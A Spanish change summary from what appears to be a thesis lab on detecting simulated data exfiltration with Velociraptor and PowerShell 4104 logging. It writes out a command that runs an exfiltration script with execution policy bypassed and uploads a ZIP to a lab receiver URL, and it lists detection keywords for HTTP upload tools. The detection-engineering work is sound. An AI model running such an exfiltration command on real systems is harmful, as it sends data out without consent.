# RESUMEN TECNICO DE CAMBIOS EVENT FINAL

Fecha: 2026-06-15

## Cambios principales

| Area | Cambio |
|---|---|
| Runner | Nuevo `TFM_Run_All_TEC_Tests_v5.ps1` derivado de v4. |
| TEC-009 | Ejecucion forzada mediante `powershell.exe -NoProfile -ExecutionPolicy Bypass -File` para mejorar evidencia 4104. |
| TEC-009 | Registro de inicio/fin local y UTC, comando ejecutado, ruta de script, summary JSON, ZIP, copia ZIP, SHA256, HTTP status y `UploadSucceeded`. |
| TEC-009 | Seccion final `TEC-009 EVIDENCE CHECK` con OK/WARN/FAIL por evidencia. |
| Artifacts | Nuevos P1/P2/P3 `CLIENT_EVENT` en `01_ARTIFACTS/candidate`. |
| P1 EVENT | Cobertura 9/9 con coste bajo y fuentes principales 4104/Sysmon/System. |
| P2 EVENT | Cobertura 9/9 con mas contexto forense y columnas ampliadas. |
| P3 EVENT | Cobertura 9/9 orientada a alerta normalizada y menor duplicidad. |
| Documentacion | Checklist logging, guia de ejecucion, matriz de cobertura y validacion local. |
| Evidencia | Nuevo script `TFM_Collect_Final_Evidence_v1.ps1` para recopilar evidencia local post-campana. |

## Decision tecnica TEC-009

El hallazgo operativo es que una llamada directa a `exfiltracion_v3.ps1` puede dejar en PowerShell 4104 solo el lanzador o una evidencia parcial. Al ejecutar el script con un proceso explicito:

```powershell
powershell.exe -NoProfile -ExecutionPolicy Bypass -File "<ruta>\exfiltracion_v3.ps1" -ReceiverUrl "http://192.168.1.129:8088/upload" -EnableUpload -TimeoutSec 60 -KeepArtifacts
```

la telemetria 4104 puede incluir el cuerpo del script con `Invoke-WebRequest`, `-Method POST`, `-InFile`, `application/zip`, `ReceiverUrl` y referencias ZIP. Por eso runner v5 usa esta forma para TEC-009.

## Deteccion TEC-009

P3 EVENT genera alerta `HIGH` por PowerShell 4104 si aparece:

- herramienta HTTP compatible: `Invoke-WebRequest`, `iwr`, `curl`, `wget`, `Invoke-RestMethod`, `WebClient` o `UploadFile`;
- carga de fichero: `-InFile`, `UploadFile`, `-Form` o `MultipartFormDataContent`;
- evidencia de ZIP/subida: `application/zip`, `.zip`, `upload` o `ReceiverUrl`.

`POST` suma evidencia, pero no bloquea la deteccion porque puede aparecer como `-Method POST` o no aparecer de forma literal en todas las variantes.

Sysmon ID 1/3/11 aporta contexto, no es condicion obligatoria para TEC-009.

## Separacion de modelos

- `CLIENT` historico/backtesting: usa `parse_evtx()` y se mantiene en P1_v3, P2_v2 y P3_v12.
- `CLIENT_EVENT` live: usa `watch_evtx()` y se entrega como P1/P2/P3 EVENT v1.

## Pendiente

La validacion final queda pendiente en la GUI de Velociraptor:

1. importar artifacts EVENT;
2. activarlos como Client Event Monitoring;
3. ejecutar runner v5;
4. exportar resultados;
5. verificar que P3 emite `TEC009_HTTP_ZIP_Upload_4104` cuando existe 4104 fuerte.
